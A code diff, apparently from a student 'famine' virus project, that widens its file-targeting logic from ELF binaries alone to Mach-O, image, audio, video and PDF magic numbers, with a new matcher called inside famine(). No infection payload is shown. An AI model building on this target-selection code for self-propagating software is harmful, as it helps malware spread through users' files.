@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
-/*   Updated: 2024/08/01 13:15:23 by mgama            ###   ########.fr       */
+/*   Updated: 2024/08/02 02:06:49 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,16 +19,34 @@ struct s_famine g_famine;
 int g_exit = 0;
 size_t count = 0;
 
-// const char magics[] = {
-// 	{0x7f, 'E', 'L', 'F'}, // ELF
-// 	{0xFF, 0xD8, 0xFF}, // JPEG
-// 	{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}, // PNG
-// 	{0x47, 0x49, 0x46, 0x38, 0x37, 0x61}, // GIF87
-// 	{0x47, 0x49, 0x46, 0x38, 0x39, 0x61}, // GIF89
-// };
-const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
+const struct s_famine_magics magics[] = {
+	// EXECUTABLES
+	{{0x7f, 'E', 'L', 'F'}, 4}, // ELF
+	{{0xCE, 0xFA, 0xED, 0xFE}, 4}, // MACH-O 32
+	{{0xCF, 0xFA, 0xED, 0xFE}, 4}, // MACH-O 64
+	// IMAGES
+	{{0xFF, 0xD8, 0xFF, 0xE0}, 4}, // JPEG
+	{{0xFF, 0xD8, 0xFF, 0xE1}, 4}, // JPEG(JFIF)
+	{{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}, 8}, // PNG
+	{{'G', 'I', 'F', '8', '7', 'a'}, 6}, // GIF87
+	{{'G', 'I', 'F', '8', '9', 'a'}, 6}, // GIF89
+	// MUSIC
+	{{'I', 'D', '3'}, 3}, // MP3
+	{{0xFF, 0xFB}, 2}, // MP3
+	{{0xFF, 0xF3}, 2}, // MP3
+	{{0xFF, 0xF2}, 2}, // MP3
+	{{'R', 'I', 'F', 'F'}, 4}, // WAV
+	// VIDEO
+	{{0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x6D, 0x70, 0x34, 0x32}, 12}, // MP4
+	{{0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D}, 12}, // MP4 variant (ISOM)
+    {{0x00, 0x00, 0x00, 0x14, 0x66, 0x74, 0x79, 0x70, 0x71, 0x74, 0x20, 0x20}, 12}, // MOV (QuickTime)
+    {{0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x6D, 0x6F, 0x6F, 0x76}, 12}, // MOV variant (moov)
+	// OTHER
+	{{'%', 'P', 'D', 'F', '-'}, 5}, // PDF
+	{0} // DO NOT REMOVE AND KEEP AT THE END
+};
+const size_t magic_size = FM_MAXMAGIC_SIZE;
 const char signature[] = FM_SIGNATURE;
-const size_t elf_magic_size = sizeof(elf_magic);
 
 int get_terminal_width() {
 	struct winsize w;
@@ -84,6 +102,18 @@ void interruptHandler(int sig)
 	g_exit = 1;
 }
 
+int	is_magic(const char *buf, const struct s_famine_magics *magic)
+{
+	for (size_t i = 0; magic[i].len != 0; i++)
+	{
+		if (memcmp(buf, magic[i].magic, magic[i].len) == 0)
+		{
+			return (1);
+		}
+	}
+	return (0);
+}
+
 void famine(char *target, char *parent)
 {
 	struct stat statbuf;
@@ -118,16 +148,16 @@ void famine(char *target, char *parent)
 	if (fd == -1) {
 		return ;
 	}
-	char buf[elf_magic_size];
-	size_t n = read(fd, buf, elf_magic_size);
-	// check if read has an error or if the number of byte if less than `elf_magic_size`
-	if (n <= 0 || n < elf_magic_size)
+	char buf[magic_size];
+	size_t n = read(fd, buf, magic_size);
+	// check if read has an error or if the number of byte if less than `magic_size`
+	if (n <= 0 || n < magic_size)
 	{
 		close(fd);
 		return ;
 	}
 
-	if (strncmp(buf, elf_magic, elf_magic_size) != 0)
+	if (is_magic(buf, magics) == 0)
 	{
 		close(fd);
 		return ;
